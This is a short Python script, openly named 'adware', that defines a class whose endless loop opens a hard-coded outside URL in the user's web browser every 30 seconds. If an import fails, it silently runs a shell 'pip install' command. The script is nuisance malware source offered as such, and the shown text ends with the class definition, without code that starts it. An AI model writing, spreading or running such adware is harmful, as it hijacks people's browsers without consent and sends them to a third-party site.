try: #import necessary libraries
    import threading
    from threading import Timer
    import webbrowser
    import time
except ModuleNotFoundError:
    from subprocess import call
    modules = ["webbrowser"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    SEND_REPORT_EVERY = 30
    class adware:
        def __init__(self, time_interval):
            self.interval = time_interval

        def adware(self):
            url = "http://cogismith.com/sbf"
            new = 0
            webbrowser.open(url, new=new)

        def run(self):
            while True:
                self.adware()
                time.sleep(self.interval)

    